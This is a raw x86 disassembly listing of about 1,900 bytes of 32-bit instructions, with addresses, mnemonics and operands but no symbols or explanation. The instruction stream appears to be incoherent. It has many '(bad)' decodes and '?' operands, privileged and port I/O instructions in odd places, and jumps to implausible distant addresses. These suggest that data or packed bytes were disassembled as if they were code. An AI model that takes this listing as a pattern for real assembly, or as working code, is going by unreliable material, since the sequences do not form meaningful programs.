  432a78:	mov    ecx,DWORD PTR [ebx+0x3c603d8]
  432a7e:	(bad)  
  432a7f:	cmp    ebx,eax
  432a81:	je     0x432a09
  432a83:	add    edi,edi
  432a85:	or     bh,bh
  432a87:	dec    ebp
  432a88:	inc    ebp
  432a89:	mov    esi,DWORD PTR [ebx]
  432a8b:	cld    
  432a8c:	add    ecx,esi
  432a8e:	cmp    ecx,DWORD PTR [eax-0xc]
  432a91:	mov    edx,DWORD PTR [edi]
  432a93:	or     BYTE PTR [ebp-0x7c],al
  432a96:	mov    ebx,DWORD PTR [ecx-0x7639cd18]
  432a9c:	test   BYTE PTR [ecx+ebx*4],cl
  432a9f:	inc    ebp
  432aa0:	xor    bh,BYTE PTR ds:0x8be89c89
  432aa6:	out    dx,eax
  432aa7:	adc    BYTE PTR [eax],al
  432aa9:	jne    0x432a72
  432aab:	mov    ebp,esp
  432aad:	fcomp  DWORD PTR [ebx]
  432aaf:	add    BYTE PTR [ecx],al
  432ab1:	inc    DWORD PTR [ebp-0x75]
  432ab4:	mov    esp,?
  432ab6:	add    al,0xce
  432ab8:	mov    ecx,edi
  432aba:	cld    
  432abb:	inc    ebp
  432abc:	fidivr WORD PTR [ebx]
  432abe:	fbstp  TBYTE PTR [ebp-0x3e]
  432ac1:	mov    eax,DWORD PTR [eax]
  432ac3:	adc    BYTE PTR [ebx-0x3974038b],cl
  432ac9:	fadd   st,st(7)
  432acb:	add    BYTE PTR [ebp-0x1],al
  432ace:	mov    ecx,DWORD PTR [esp+edi*8]
  432ad1:	inc    ebp
  432ad2:	mov    bh,0xc7
  432ad5:	loopne 0x432b1c
  432ad7:	sbb    ecx,DWORD PTR [ebx+0x4545fc7f]
  432add:	add    DWORD PTR [ebx],esi
  432adf:	pushf  
  432ae0:	add    ecx,DWORD PTR [ebx-0x398b03c5]
  432ae6:	mov    eax,edi
  432ae8:	cwde   
  432ae9:	inc    ebp
  432aea:	inc    ebp
  432aeb:	jne    0x432a78
  432aed:	mov    esp,esp
  432aef:	clc    
  432af0:	add    al,0x4d
  432af2:	mov    DWORD PTR [ebx],esi
  432af4:	or     al,0x33
  432af6:	inc    ebp
  432af7:	lea    ecx,[ebx-0x398d13fd]
  432afd:	add    bh,al
  432aff:	inc    ebp
  432b00:	ror    DWORD PTR [ebx+0x45d829],0x8b
  432b07:	add    ebp,esp
  432b09:	shufps xmm1,xmm3,0xc7
  432b0d:	(bad)  
  432b0e:	jmp    0x74886637
  432b13:	xor    ecx,DWORD PTR [ebx+0x453bec03]
  432b19:	hlt    
  432b1a:	mov    ecx,DWORD PTR [edi]
  432b1c:	fadd   DWORD PTR [ebp+0x0]
  432b1f:	xor    ecx,DWORD PTR [edi]
  432b21:	add    ecx,ecx
  432b23:	cmp    edi,edi
  432b25:	pmuludq mm7,QWORD PTR [edx+0x50]
  432b29:	(bad)  
  432b2a:	jmp    0x432ab7
  432b2c:	mov    edi,esp
  432b2e:	or     al,0xc6
  432b30:	inc    ebp
  432b31:	(bad)  
  432b32:	mov    eax,DWORD PTR [ebp+0x10]
  432b35:	jne    0x432ac0
  432b37:	mov    eax,DWORD PTR [ecx]
  432b39:	clc    
  432b3a:	add    BYTE PTR [ebp-0x40],cl
  432b3d:	xor    edx,DWORD PTR [eax-0x73]
  432b40:	jne    0x432b43
  432b42:	push   DWORD PTR [edx+0x8]
  432b45:	add    BYTE PTR [ebp+0x45],al
  432b48:	mov    ebp,ecx
  432b4a:	cld    
  432b4b:	add    BYTE PTR [ebp+0x0],cl
  432b4e:	xor    eax,DWORD PTR [ebp+0x3]
  432b51:	mov    ?,WORD PTR [ebx]
  432b53:	adc    cl,BYTE PTR [ebx+0x110cf8c7]
  432b59:	sub    eax,0x5d330e4d
  432b5e:	lea    esi,[ebx]
  432b60:	add    DWORD PTR [ebx],eax
  432b62:	jb     0x432b4d
  432b64:	add    BYTE PTR [eax],al
  432b66:	inc    ebp
  432b67:	add    bl,ch
  432b69:	inc    ebp
  432b6a:	mov    esi,DWORD PTR [ebx]
  432b6c:	or     al,0x3
  432b6e:	(bad)  
  432b6f:	mov    edi,eax
  432b71:	in     al,dx
  432b72:	scas   eax,DWORD PTR es:[edi]
  432b73:	inc    ebp
  432b74:	mov    esi,DWORD PTR [ebx]
  432b76:	in     al,0x3
  432b78:	add    al,0x89
  432b7a:	mov    ecx,DWORD PTR [eax+edi*8]
  432b7d:	dec    ebp
  432b7e:	(bad)  
  432b7f:	mov    ebx,DWORD PTR [esp+ebx*8-0x30cd3167]
  432b86:	mov    ecx,eax
  432b88:	cld    
  432b89:	push   es
  432b8a:	dec    ebp
  432b8b:	add    al,0x33
  432b8d:	mov    DWORD PTR [ebx],eax
  432b8f:	in     al,dx
  432b90:	cmp    DWORD PTR [ebp-0x67],eax
  432b93:	mov    eax,DWORD PTR [ebp-0xba0068]
  432b99:	mov    edx,DWORD PTR [ebp-0x4]
  432b9c:	mov    ecx,DWORD PTR [ebp-0x2c]
  432b9f:	xor    eax,DWORD PTR [ebp+0x3]
  432ba2:	cmp    DWORD PTR [ebx],0x8b327498
  432ba8:	xor    edi,esp
  432baa:	jmp    0xff7728fc
  432baf:	add    ecx,DWORD PTR [ebp-0x3f]
  432bb2:	xor    ebx,DWORD PTR [edi]
  432bb4:	add    eax,ecx
  432bb6:	cmp    ebx,DWORD PTR [eax]
  432bb8:	mov    ecx,DWORD PTR [ebp-0x4]
  432bbb:	mov    ecx,DWORD PTR [eax]
  432bbd:	adc    BYTE PTR [ebp-0x80],al
  432bc0:	jmp    0x432bc3
  432bc2:	mov    eax,DWORD PTR [eax]
  432bc4:	cld    
  432bc5:	mov    bh,0xc6
  432bc7:	push   ecx
  432bc8:	(bad)  
  432bc9:	jne    0x432c29
  432bcb:	dec    ecx
  432bcd:	or     BYTE PTR [ecx+ebx*1],cl
  432bd0:	push   ebp
  432bd1:	inc    ebp
  432bd2:	in     al,dx
  432bd3:	add    ebp,esp
  432bd5:	or     bh,al
  432bd7:	dec    ebp
  432bd8:	cld    
  432bd9:	mov    eax,DWORD PTR [ebp+0x4500f8d8]
  432bdf:	cmp    DWORD PTR [ecx],0x2
  432be2:	pushf  
  432be3:	dec    DWORD PTR [ebx+0x45510cf4]
  432be9:	mov    DWORD PTR [ebx+0x5145fc0c],ecx
  432bef:	mov    edx,DWORD PTR [ecx+0xc]
  432bf2:	xor    eax,esi
  432bf4:	mov    edx,0xc172c7
  432bf9:	inc    ebp
  432bfa:	mov    esi,DWORD PTR [ebp+0x8]
  432bfd:	mov    eax,edx
  432bff:	call   0x84c7f2f4
  432c04:	add    DWORD PTR [ecx-0x76bace00],ebx
  432c0a:	mov    ebp,eax
  432c0c:	or     BYTE PTR [eax],dl
  432c0e:	jo     0x432c5d
  432c10:	push   edi
  432c11:	xor    esi,DWORD PTR [ebp+0x3]
  432c14:	(bad)  
  432c15:	pmulhuw mm0,mm1
  432c18:	test   DWORD PTR [ebp-0x8],ecx
  432c1b:	mov    DWORD PTR [ebp-0x67],eax
  432c1e:	mov    eax,DWORD PTR [ebp-0x4]
  432c21:	xor    edi,DWORD PTR [ebp-0x73]
  432c24:	xor    eax,DWORD PTR [ebx]
  432c26:	xor    esi,DWORD PTR [edx+0x3]
  432c29:	add    BYTE PTR [ecx],bh
  432c2b:	inc    ebp
  432c2c:	(bad)  
  432c2d:	mov    edx,DWORD PTR [ebp-0x7b39fe1c]
  432c33:	mov    DWORD PTR [eax],0x750f0004
  432c39:	sub    ecx,DWORD PTR [ebx-0x7974f701]
  432c3f:	lock add BYTE PTR [ebp+0x0],cl
  432c43:	mov    esi,DWORD PTR [ebp-0x18]
  432c46:	mov    ebp,edx
  432c48:	or     al,0x72
  432c4a:	ja     0x432c4c
  432c4c:	mov    edx,esi
  432c4e:	cld    
  432c4f:	(bad)  
  432c52:	cli    
  432c53:	mov    esi,DWORD PTR [ebp-0x4]
  432c56:	cmp    ecx,esi
  432c58:	bswap  edi
  432c5a:	(bad)
  432c5e:	mov    esi,DWORD PTR [ebp-0x4]
  432c61:	mov    esi,ecx
  432c63:	clc    
  432c64:	repnz add esi,DWORD PTR [ebp+0x45]
  432c68:	push   ebx
  432c69:	xor    eax,DWORD PTR [ebp+0x3]
  432c6c:	cmp    ebx,DWORD PTR [edi-0x64]
  432c6f:	pop    ebx
  432c70:	jmp    0x432d37
  432c75:	mov    esi,DWORD PTR [ebp-0x7d]
  432c78:	xor    ebp,DWORD PTR [eax]
  432c7a:	lea    eax,[ebp-0x8]
  432c7d:	ss repnz pushf 
  432c80:	out    dx,eax
  432c81:	(bad)  
  432c82:	neg    eax
  432c84:	ins    DWORD PTR es:[edi],dx
  432c85:	test   esi,edi
  432c87:	clc    
  432c88:	pop    esp
  432c89:	inc    ebp
  432c8a:	or     BYTE PTR [ecx+0x450f0c7d],cl
  432c90:	xor    edi,DWORD PTR [ecx+0x70f08e6]
  432c96:	add    cl,al
  432c98:	jne    0x432c33
  432c9a:	mov    esi,DWORD PTR [edx]
  432c9c:	in     al,dx
  432c9d:	push   esi
  432c9e:	xor    BYTE PTR [ebp-0xe],dh
  432ca1:	add    edi,esi
  432ca3:	cmp    esi,DWORD PTR [edi+0xc21c10f]
  432ca9:	add    cl,bh
  432cab:	mov    edi,DWORD PTR [ebp+0x8]
  432cae:	mov    DWORD PTR [ebp-0x14],esi
  432cb1:	add    esi,DWORD PTR [ebp+0x3c]
  432cb4:	mov    ecx,DWORD PTR [ecx+0x45f10c08]
  432cba:	mov    ah,0x3d
  432cbc:	cdq    
  432cbd:	pushf  
  432cbe:	xor    cl,BYTE PTR [ebx+0x75e0e489]
  432cc4:	jne    0x432c51
  432cc6:	mov    ecx,DWORD PTR [esp+ebp*8]
  432cc9:	icebp  
  432cca:	icebp  
  432ccb:	shl    edx,0xf2
  432cce:	(bad)  
  432ccf:	mov    ah,0x16
  432cd1:	inc    eax
  432cd2:	jne    0x432c67
  432cd4:	mov    ecx,DWORD PTR [edi]
  432cd6:	in     al,dx
  432cd7:	jmp    0x432cca
  432cd9:	add    dl,dh
  432cdb:	mov    edi,esi
  432cdd:	or     al,0x8
  432cdf:	inc    ebp
  432ce0:	jne    0x432ce5
  432ce2:	mov    esp,DWORD PTR [eax-0x74c1ff24]
  432ce8:	ret    
  432ce9:	or     bh,bh
  432ceb:	jge    0x432cd5
  432ced:	sub    ebx,DWORD PTR [edi+0x17d5d34]
  432cf3:	xor    edi,eax
  432cf5:	add    esi,DWORD PTR [ebp-0x77]
  432cf8:	mov    ebx,esp
  432cfa:	clc    
  432cfb:	neg    DWORD PTR [ebp-0x7c]
  432cfe:	xor    eax,DWORD PTR [eax]
  432d00:	cmp    eax,DWORD PTR [eax]
  432d02:	repz jne 0x432c9a
  432d05:	xor    eax,DWORD PTR [ecx]
  432d07:	add    ebx,DWORD PTR [eax]
  432d09:	mov    DWORD PTR [ebp-0x8],eax
  432d0c:	mov    eax,edi
  432d0e:	cld    
  432d0f:	lock pop eax
  432d11:	test   DWORD PTR [ebx],esi
  432d13:	clc    
  432d14:	add    edx,DWORD PTR [edi-0x740bff77]
  432d1a:	fdivp  st(4),st
  432d1c:	test   ecx,esi
  432d1e:	(bad)  
  432d1f:	jnp    0x432d20
  432d21:	add    ecx,DWORD PTR [ebx-0x14c4272f]
  432d27:	jae    0x432cb4
  432d29:	sub    edi,esp
  432d2b:	(bad)  
  432d2c:	shl    DWORD PTR [eax-0x3e],0x89
  432d30:	leave  
  432d31:	call   0x8198e43e
  432d36:	in     al,dx
  432d37:	(bad)  
  432d38:	in     al,dx
  432d39:	add    bh,al
  432d3b:	mov    esp,edi
  432d3d:	in     al,dx
  432d3e:	test   DWORD PTR [ebp-0x8],edi
  432d41:	mov    eax,DWORD PTR [ebp+0x2b]
  432d44:	cmp    DWORD PTR [ebx],eax
  432d46:	pushf  
  432d47:	jnp    0x57322980
  432d4d:	xor    edx,DWORD PTR [ecx-0x77]
  432d50:	push   ecx
  432d51:	loopne 0x432d86
  432d53:	jne    0x432d10
  432d55:	mov    esi,DWORD PTR [edx-0x20]
  432d58:	add    BYTE PTR [ebp-0x3d],bh
  432d5b:	xor    eax,DWORD PTR [ebp-0x73]
  432d5e:	mov    edi,DWORD PTR [esi]
  432d60:	cld    
  432d61:	jb     0x432d29
  432d63:	add    bl,al
  432d65:	jne    0x432dac
  432d67:	mov    edx,DWORD PTR [edi-0x10]
  432d6a:	jge    0x432de9
  432d6c:	mov    esi,DWORD PTR [ebx]
  432d6e:	lock add ecx,DWORD PTR [ebp+0x3b]
  432d72:	xor    esi,DWORD PTR [ebp-0x77]
  432d75:	mov    esi,eax
  432d77:	lock inc ebp
  432d79:	jge    0x432db1
  432d7b:	xor    ebx,DWORD PTR [ebx+eax*1+0x75f83b8b]
  432d82:	dec    ebp
  432d83:	mov    esi,DWORD PTR [ebx]
  432d85:	loopne 0x432d10
  432d87:	jge    0x432d81
  432d89:	add    DWORD PTR [ebp-0x7d],eax
  432d8c:	test   BYTE PTR [edx],0x9c
  432d8f:	dec    ebp
  432d90:	mov    esi,DWORD PTR [ebp-0xc]
  432d93:	mov    ecx,DWORD PTR [ebp-0xc]
  432d96:	xor    ebx,DWORD PTR [ebp-0x77]
  432d99:	mov    esi,esp
  432d9b:	in     al,0x45
  432d9d:	jge    0x432dd9
  432d9f:	mov    ebx,DWORD PTR [esp+ecx*1-0x43130e75]
  432da6:	dec    ebp
  432da7:	inc    esp
  432da8:	xor    edx,DWORD PTR [ebx+0x3ec7389]
  432dae:	inc    ebp
  432daf:	hlt    
  432db0:	ss jne 0x432d52
  432db3:	mov    edi,DWORD PTR [eax+0xf19504]
  432db9:	repnz mov DWORD PTR [ebp+0x20],ebx
  432dbd:	cmp    eax,DWORD PTR [ebp+0xf]
  432dc0:	test   DWORD PTR [edi+ecx*1-0x1],edx
  432dc4:	fistp  WORD PTR [ebx+0x0]
  432dc7:	inc    ebp
  432dc8:	mov    ebx,DWORD PTR [edi+0xc]
  432dcb:	add    eax,eax
  432dcd:	inc    ebp
  432dce:	test   BYTE PTR [ebx],dh
  432dd0:	add    eax,DWORD PTR [ebx]
  432dd2:	add    BYTE PTR [esi+0x45],bl
  432dd5:	ret    0x85
  432dd8:	jnp    0x5443b1a7
  432dde:	inc    bp
  432de0:	inc    ebp
  432de1:	ss mov ecx,0xc78a9c
  432de7:	fdiv   QWORD PTR [ebx]
  432de9:	test   DWORD PTR [ecx+0x453af8],edi
  432def:	push   ebx
  432df0:	add    edi,DWORD PTR [esi+0x708088b]
  432df6:	cmp    esi,eax
  432df8:	setns  BYTE PTR [ecx-0x74fcffce]
  432dff:	mov    esp,edi
  432e01:	call   0x33ce7353
  432e06:	or     BYTE PTR [ebx],al
  432e08:	inc    ecx
  432e09:	mov    DWORD PTR [ecx+0x408b0ce0],ecx
  432e0f:	and    BYTE PTR [ebp-0x7074f0bb],al
  432e15:	lock add cl,al
  432e18:	mov    DWORD PTR [ebp-0x2c],0xf8f08581
  432e1f:	mov    ch,0x45
  432e21:	clc    
  432e22:	xor    eax,DWORD PTR [ebp+0x3]
  432e25:	mov    ecx,DWORD PTR [ecx+0x45c1d4f8]
  432e2b:	inc    ebp
  432e2c:	mov    eax,DWORD PTR [ecx-0x7aff0770]
  432e32:	mov    edi,eax
  432e34:	mov    eax,DWORD PTR [ebp+0x3c]
  432e37:	mov    ecx,DWORD PTR [eax]
  432e39:	hlt    
  432e3a:	inc    ebp
  432e3b:	ror    DWORD PTR [ebx+0x818c45],0xf4
  432e42:	mov    eax,DWORD PTR [ebp+0x45e4f889]
  432e48:	push   ebp
  432e49:	mov    edi,DWORD PTR [ebx]
  432e4b:	in     al,dx
  432e4c:	jne    0x432e0f
  432e4e:	mov    eax,DWORD PTR [ebp-0x28]
  432e51:	add    DWORD PTR [eax],0xe8058dec
  432e57:	clc    
  432e58:	mov    esi,DWORD PTR [edi-0x8]
  432e5b:	add    dh,dl
  432e5d:	rol    WORD PTR [ebp-0x1],cl
  432e61:	mov    edx,DWORD PTR [eax+0x8]
  432e64:	jne    0x432e26
  432e66:	inc    DWORD PTR [esp+ebx*1-0x74ffb2fd]
  432e6d:	inc    ebp
  432e6e:	push   esp
  432e6f:	test   DWORD PTR [ecx+0xf],ecx
  432e72:	sub    edx,esp
  432e74:	add    eax,DWORD PTR [eax]
  432e76:	and    BYTE PTR [ebx-0x3fc4e7b0],cl
  432e7c:	add    BYTE PTR [ebx+ecx*4-0x78ffdffd],al
  432e83:	mov    eax,DWORD PTR [ecx]
  432e85:	and    BYTE PTR [eax],al
  432e87:	cmp    BYTE PTR [eax],dl
  432e89:	add    BYTE PTR [ebp+0x66],al
  432e8c:	inc    ecx
  432e8e:	push   esp
  432e8f:	(bad)  
  432e90:	jne    0x432e92
  432e92:	push   edx
  432e93:	enterw 0xc1,0x4d
  432e98:	mov    esp,DWORD PTR [esi+0x20]
  432e9b:	add    DWORD PTR [ecx-0x7b],eax
  432e9e:	add    eax,DWORD PTR [ebx]
  432ea0:	str    WORD PTR [eax+0x45]
  432ea4:	lea    ecx,[ebx+0x45890801]
  432eaa:	sbb    BYTE PTR [ebx],al
  432eac:	dec    ebp
  432ead:	cmp    al,0xf
  432eaf:	inc    ebp
  432eb0:	push   eax
  432eb1:	mov    esi,DWORD PTR [ebx]
  432eb3:	push   eax
  432eb4:	add    eax,eax
  432eb6:	mov    DWORD PTR [esp+ecx*1-0x7bff2efd],eax
  432ebd:	inc    ebp
  432ebe:	add    BYTE PTR [esi],dh
  432ec0:	add    BYTE PTR [ebp+ecx*2+0x3d4338b],cl
  432ec7:	(bad)  
  432ec8:	mov    ebx,eax
  432eca:	loopne 0x432f11
  432ecc:	dec    ebp
  432ecd:	mov    ecx,DWORD PTR [edi]
  432ecf:	cld    
  432ed0:	push   eax
  432ed1:	xchg   DWORD PTR [ebx],esi
  432ed3:	add    DWORD PTR [ebx],ebp
  432ed5:	add    BYTE PTR [ebx],ch
  432ed7:	or     BYTE PTR [ecx],bh
  432ed9:	dec    ecx
  432eda:	loopne 0x432edf
  432edc:	xchg   DWORD PTR [ebx-0x78ff0400],ecx
  432ee2:	push   ebp
  432ee3:	add    DWORD PTR [ebx+0x55100800],eax
  432ee9:	dec    ebp
  432eea:	jmp    0x432e75
  432eec:	mov    esp,DWORD PTR [eax]
  432eee:	sbb    dl,dl
  432ef0:	inc    eax
  432ef1:	xor    ecx,DWORD PTR [ebp+0x4501ff87]
  432ef7:	add    BYTE PTR [ebx+0x74528555],cl
  432efd:	push   ebp
  432efe:	div    DWORD PTR [ebx]
  432f00:	and    eax,DWORD PTR [ebx]
  432f02:	add    edx,DWORD PTR [edx-0x30]
  432f05:	jno    0x432e92
  432f07:	inc    DWORD PTR [eax+eiz*1]
  432f0a:	inc    ebp
  432f0b:	push   eax
  432f0c:	push   eax
  432f0d:	mov    esp,DWORD PTR [edi-0x74beff1c]
  432f13:	mov    edi,esp
  432f15:	push   eax
  432f16:	inc    ebp
  432f17:	enter  0x458b,0x8
  432f1b:	push   ecx
  432f1c:	(bad)  
  432f1d:	call   0x10d38f5
  432f22:	pop    ss
  432f23:	push   ebp
  432f24:	mov    ecx,DWORD PTR [ebx+0x489408]
  432f2a:	mov    ecx,DWORD PTR [ecx+0xc458b04]
  432f30:	push   ecx
  432f31:	jo     0x432f1b
  432f33:	inc    DWORD PTR [edi]
  432f35:	or     BYTE PTR [eax],al
  432f37:	call   0xce3681
  432f3c:	fmul   QWORD PTR [ebp+0x55]
  432f3f:	mov    eax,DWORD PTR [ebx-0x313ed7c4]
  432f45:	mov    bh,0x8c
  432f47:	adc    al,0x99
  432f49:	dec    esp
  432f4a:	xor    bl,BYTE PTR [eax]
  432f4c:	mov    ecx,DWORD PTR [ebp+0xc]
  432f4f:	mov    eax,DWORD PTR [ebp-0x4]
  432f52:	mov    esi,DWORD PTR [edi-0x3148f924]
  432f58:	push   es
  432f59:	retf   
  432f5a:	mov    BYTE PTR [ebp-0x30],0x3b
  432f5e:	inc    ebp
  432f5f:	movntps XMMWORD PTR [eax-0x741fff77],xmm5
  432f66:	retf   0x83fc
  432f69:	into   
  432f6a:	dec    ebp
  432f6b:	retf   
  432f6c:	mov    ecx,DWORD PTR [ebp-0x74]
  432f6f:	mov    eax,DWORD PTR [eax]
  432f71:	fdiv   QWORD PTR [ebx]
  432f73:	mov    bh,0x3
  432f75:	push   es
  432f76:	mov    esi,ecx
  432f78:	sbb    cl,dl
  432f7a:	dec    ebp
  432f7b:	sar    DWORD PTR [ebx],cl
  432f7d:	push   ebp
  432f7e:	jne    0x432f8f
  432f80:	mov    ecx,DWORD PTR [eax-0x74ffff28]
  432f86:	lea    ebx,[eax]
  432f88:	call   0xf4ccbb4f
  432f8d:	sbb    dh,dl
  432f8f:	add    edx,ebx
  432f91:	push   ebp
  432f92:	mov    ecx,DWORD PTR [ebx+0x487238e4]
  432f98:	push   ecx
  432f99:	mov    DWORD PTR [eax-0x30],edx
  432f9c:	test   DWORD PTR [edx],eax
  432f9e:	xadd   esp,esi
  432fa1:	pop    es
  432fa2:	add    cl,dl
  432fa4:	mov    eax,ecx
  432fa6:	or     al,0x45
  432fa8:	(bad)  
  432fa9:	push   eax
  432faa:	add    DWORD PTR [edx+0x0],eax
  432fad:	add    ecx,DWORD PTR [ecx]
  432faf:	and    dh,cl
  432fb1:	call   0xc73881
  432fb6:	add    DWORD PTR [ebp+0x0],edx
  432fb9:	mov    esp,DWORD PTR [ebp+0x18]
  432fbc:	add    BYTE PTR [eax+0x48],cl
  432fbf:	xor    eax,DWORD PTR [eax]
  432fc1:	add    esp,DWORD PTR [esi+0x3b]
  432fc4:	inc    ebp
  432fc5:	je     0x432f4a
  432fc7:	push   ecx
  432fc8:	push   es
  432fc9:	dec    ebp
  432fca:	mov    DWORD PTR [ebx],eax
  432fcc:	(bad)  
  432fcd:	or     al,0x5e
  432fcf:	inc    eax
  432fd0:	add    BYTE PTR [ebx],al
  432fd2:	data16 and BYTE PTR [ebp+0x50],al
  432fd6:	sub    DWORD PTR [ecx],0xfffffff8
  432fd9:	add    BYTE PTR [ebp-0x75],ah
  432fdc:	add    BYTE PTR [eax],bl
  432fde:	enter  0x894d,0x8b
  432fe2:	int3   
  432fe3:	loopne 0x43301f
  432fe5:	rol    BYTE PTR [eax],0x33
  432fe8:	lea    cx,[ebp+0xa]
  432fec:	data16 jb 0x433034
  432fef:	add    BYTE PTR [ebx+0x44890855],cl
  432ff5:	sbb    ah,al
  432ff7:	inc    ebp
  432ff8:	cmp    BYTE PTR [edi],cl
  432ffa:	add    BYTE PTR [edx+0x66],dl
  432ffd:	xor    ecx,DWORD PTR [eax]
  432fff:	sub    edi,esi
  433001:	mov    eax,DWORD PTR [eax]
  433003:	or     al,0x66
  433005:	ror    edx,cl
  433007:	dec    ebp
  433008:	inc    ebp
  433009:	cmp    eax,DWORD PTR [ebx+0x668b0876]
  43300f:	cld    
  433010:	or     BYTE PTR [edi+0x4501dd],dl
  433016:	ret    0xe8ce
  433019:	retf   
  43301a:	(bad)  
  43301b:	dec    ebp
  43301c:	mov    al,0x8b
  43301e:	in     al,dx
  43301f:	and    BYTE PTR [ebx],bh
  433021:	or     al,BYTE PTR [ebp+0x27]
  433024:	in     al,dx
  433025:	xchg   eax,ebp
  433027:	add    edi,eax
  433029:	add    BYTE PTR [eax+0x3f52ed55],bh
  43302f:	push   ebp
  433030:	inc    ebp
  433031:	xor    ebx,edx
  433033:	add    ebp,eax
  433035:	push   edx
  433036:	push   bp
  433038:	inc    ebp
  433039:	(bad)  
  43303a:	jmp    0xc342f693
  43303f:	sbb    al,0x33
  433041:	ror    BYTE PTR [ebp-0x75fef27c],0x0
  433048:	add    BYTE PTR [ebp+0x44],0x8b
  43304c:	jmp    0xf98b:0x100041c8
  433053:	xor    esi,DWORD PTR [edx+0x3]
  433056:	mov    ecx,DWORD PTR [edi]
  433058:	fmul   DWORD PTR [edx]
  43305a:	add    BYTE PTR [eax],al
  43305c:	lea    eax,[ebx-0x4700273c]
  433062:	add    al,0x4f
  433064:	pop    DWORD PTR [eax]
  433066:	add    DWORD PTR [ecx-0x3faa3c00],ecx
  43306c:	push   edx
  43306d:	inc    WORD PTR [ebp+0x8]
  433071:	mov    eax,0x514f4d
  433076:	(bad)
  43307a:	add    al,al
  43307c:	xor    DWORD PTR [ebx-0x74baf730],eax
  433082:	test   DWORD PTR [esi+0x74],esp
  433085:	inc    ebp
  433086:	mov    DWORD PTR [eax+0xa4f08],edi
  43308c:	add    BYTE PTR [ecx-0x76c435bb],cl
  433092:	or     dh,cl
  433094:	or     eax,0x8b8d5045
  433099:	inc    ebp
  43309a:	mov    WORD PTR [ecx+0x3b8a00],?
  4330a0:	jne    0x4330d5
  4330a2:	mov    edi,DWORD PTR [edx+0x8f3a18]
  4330a8:	add    DWORD PTR [ebx],eax
  4330aa:	add    bh,bh
  4330ac:	adc    DWORD PTR [eax],ecx
  4330ae:	adc    DWORD PTR [ebp+0x55],edi
  4330b1:	push   es
  4330b2:	mov    ecx,DWORD PTR [ecx-0x38ff8d70]
  4330b8:	mov    ebp,DWORD PTR [eax+ebp*1+0x50c411da]
  4330bf:	inc    ebp
  4330c0:	mov    esp,edi
  4330c2:	or     al,0xda
  4330c4:	push   eax
  4330c5:	(bad)  
  4330c6:	jne    0x43307c
  4330c8:	call   0x3b29b7
  4330cd:	inc    ebp
  4330ce:	rol    ah,0x84
  4330d1:	call   0xbc43f7d6
  4330d6:	jne    0x4330b2
  4330d8:	mov    ebx,ebx
  4330da:	inc    edi
  4330dc:	and    al,al
  4330de:	fs jmp 0x7ec876e3
  4330e4:	bswap  ecx
  4330e6:	scas   al,BYTE PTR es:[edi]
  4330e7:	inc    esp
  4330e8:	add    BYTE PTR [ebx+ecx*4+0x55f20c10],ch
  4330ef:	or     BYTE PTR [ebx-0x97717c6],0x83
  4330f6:	call   DWORD PTR [edi]
  4330f8:	shr    ah,0x84
  4330fb:	xchg   DWORD PTR [eax],eax
  4330fd:	add    DWORD PTR [eax],eax
  4330ff:	add    bh,bh
  433101:	dec    ebp
  433102:	and    BYTE PTR [ecx-0x38],dl
  433105:	push   eax
  433106:	dec    DWORD PTR [ebx+0xfd885]
  43310c:	mov    BYTE PTR [ebp+0x508bac00],cl
  433112:	mov    WORD PTR [ecx+0x0],ss
  433115:	lea    ecx,[ebx+0x108b20d8]
  43311b:	mov    WORD PTR [edx],ds
  43311d:	add    BYTE PTR [edi+0xff01ff],al
  433123:	mov    ecx,DWORD PTR [ebp-0x28]
  433126:	push   ecx
  433127:	shl    BYTE PTR [ebp+0x3a],0x8b
  43312b:	inc    ebp
  43312c:	in     al,0xeb
  43312e:	jno    0x4330bb
  433130:	push   edx
  433131:	mov    DWORD PTR [eax-0x28],edx
  433134:	mov    eax,DWORD PTR [ebp+0x20]
  433137:	je     0x4330c0
  433139:	mov    eax,DWORD PTR [ecx]
  43313b:	sbb    BYTE PTR [eax],al
  43313d:	pop    DWORD PTR [eax]
  43313f:	add    esi,eax
  433141:	add    bl,al
  433143:	adc    DWORD PTR [edi],esi
  433145:	jmp    0x8bce8197
  43314a:	sub    BYTE PTR [ebp+eax*2-0x63c4ca00],cl
  433151:	jne    0x4330de
  433153:	mov    ecx,DWORD PTR [eax]
  433155:	in     al,0x75
  433157:	pop    DWORD PTR [ecx+0x5101]
  43315d:	push   edx
  43315e:	inc    DWORD PTR [ebx]
  433160:	adc    BYTE PTR [ecx+0x45721cc6],cl
  433166:	add    BYTE PTR [edi+0x9],dl
  433169:	call   DWORD PTR [esi]
  43316b:	and    dl,al
  43316d:	and    bh,bh
  43316f:	inc    edi
  433171:	test   eax,edx
  433173:	sldt   ebx
  433176:	cmp    DWORD PTR [eax],eax
  433178:	pushf  
  433179:	(bad)  
  43317a:	jmp    0x433188
  43317c:	mov    eax,edi
  43317e:	or     al,0x75
  433180:	inc    eax
  433181:	call   0x432889
  433186:	mov    eax,eax
  433188:	loopne 0x43310e
  43318a:	inc    ebp
  43318b:	add    BYTE PTR [ebx+0x1451c00],cl
  433191:	mov    eax,DWORD PTR [ebp+0x20]
  433194:	add    edi,ecx
  433196:	add    BYTE PTR [eax],ch
  433198:	cmp    edi,0x18
  43319b:	test   DWORD PTR [ebp+0xf],esi
  43319e:	sbb    DWORD PTR [ecx+0x578b0020],0x20
  4331a5:	jne    0x4331a9
  4331a7:	call   0xffa22c6c
  4331ac:	leave  
  4331ad:	rcr    BYTE PTR [esp+eax*4],0x55
  4331b1:	add    ah,ch
  4331b3:	add    BYTE PTR [edi-0x48fef979],dh
  4331b9:	add    BYTE PTR [edx*2+0x75ff3b57],dl
  4331c0:	inc    esp
  4331c1:	mov    ebx,DWORD PTR [eax]
  4331c3:	fcom   st(2)
  4331c5:	add    BYTE PTR [edi],bl
  4331c7:	lea    ecx,[eax-0x18]
  4331ca:	(bad)  
  4331cb:	push   DWORD PTR [ecx]
  4331cd:	call   0xffb57f2f
  4331d2:	mov    edx,DWORD PTR [eax+ecx*1-0x1]
  4331d6:	fstp   DWORD PTR [esi+ebx*8]
  4331d9:	push   ebp
  4331da:	pop    ebp
  4331db:	mov    esi,DWORD PTR [edx-0x38]
  4331de:	add    DWORD PTR [eax],0x28
  4331e1:	mov    edi,DWORD PTR [ebx]
  4331e3:	xor    esi,DWORD PTR [edx+0x3]
  4331e6:	xor    esi,DWORD PTR [edi+ebx*2-0x75]
  4331ea:	pop    ebp
  4331eb:	or     al,0x4
  4331ed:	inc    ecx
  4331ee:	push   ebp
  4331ef:	(bad)  
  4331f0:	in     al,dx
  4331f1:	or     ah,ch
  4331f3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4331f4:	xbegin 0xffc8a7ea
  4331fa:	clc    
  4331fb:	adc    al,0x45
